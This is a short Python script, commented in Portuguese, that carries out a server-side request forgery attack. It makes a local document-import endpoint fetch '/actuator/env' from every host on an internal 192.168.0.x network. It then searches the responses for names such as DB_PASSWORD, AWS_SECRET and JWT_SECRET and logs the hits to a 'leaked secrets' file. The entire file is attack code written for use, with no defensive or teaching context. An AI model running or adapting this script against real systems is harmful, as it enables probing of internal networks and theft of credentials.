import requests
import json
import re

# Parte 1: Função para enviar requisições POST
def enviar_requisicoes_post():
    """
    Envia requisições POST para o endpoint '/api/documents/importar' com payloads diferentes.
    """
    lista_ips = [f"192.168.0.{i}" for i in range(1, 255)]  # Gera uma lista de IPs da rede interna
    for ip in lista_ips:
        url_importacao = f"http://{ip}:8080/actuator/env"
        payload = {"url_importacao": url_importacao}
        try:
            resposta = requests.post("http://localhost:8080/api/documents/importar", json=payload)
            yield resposta
        except requests.exceptions.RequestException as e:
            print(f"Erro ao enviar requisição para {url_importacao}: {e}")

# Parte 2: Função para parsear a resposta e procurar segredos
def parsear_resposta(resposta):
    """
    Parseia a resposta JSON e procura por segredos.
    """
    try:
        dados_json = resposta.json()
        segredos_encontrados = []
        for chave, valor in dados_json.items():
            if isinstance(valor, str):  # Verifica se o valor é uma string
                segredos = re.findall(r"(DB_PASSWORD|AWS_SECRET|JWT_SECRET)", valor)
                if segredos:
                    segredos_encontrados.extend(segredos)
        return segredos_encontrados
    except json.JSONDecodeError:
        return []

# Parte 3: Bloco de execução
def main():
    with open("segredos_vazados.txt", "a") as arquivo:
        for resposta in enviar_requisicoes_post():
            segredos_encontrados = parsear_resposta(resposta)
            if segredos_encontrados:
                for segredo in segredos_encontrados:
                    arquivo.write(f"{segredo}\n")

if __name__ == "__main__":
    main()